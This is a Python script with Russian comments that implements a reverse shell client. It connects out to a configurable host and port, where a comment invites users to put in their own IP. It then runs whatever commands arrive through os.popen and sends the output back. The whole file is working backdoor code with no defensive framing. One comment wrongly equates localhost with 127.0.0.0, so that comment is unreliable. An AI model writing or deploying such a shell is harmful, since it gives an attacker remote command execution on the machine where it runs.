import os
import socket


# создаем функцию , которая будет обрабатывать наши команды
def ExecuteCommands(command):
    execute_c = os.popen(command).read()
    return execute_c


# создаем главную функцию и обработку команд
def Main():
    host = 'localhost'  # - Тут ваш IP localhost == 127.0.0.0.
    port = 4444  # Порт, юзайте который никогда не занят
    while True:
        try:
            soc = socket.socket()  # Создаем сокет
            soc.connect((host, port))  # передаем в функцию коннект IP и Port
        except:
            break  # Выход из цикла в случае неудачи
        while True:
            try:
                data = soc.recv(1024).decode()  # получаем данные из консоли сервера
                execute_c = ExecuteCommands(str(data))  # передаем функции полученную команду от сервера
                if len(execute_c) == 0:  # Если р-тат пуст , то отправляем пробел
                    soc.send(''.encode())
                else:
                    soc.send(execute_c.encode())
            except:
                break
    soc.close()  # закрываем соединение


if __name__ == "__main__":
    Main()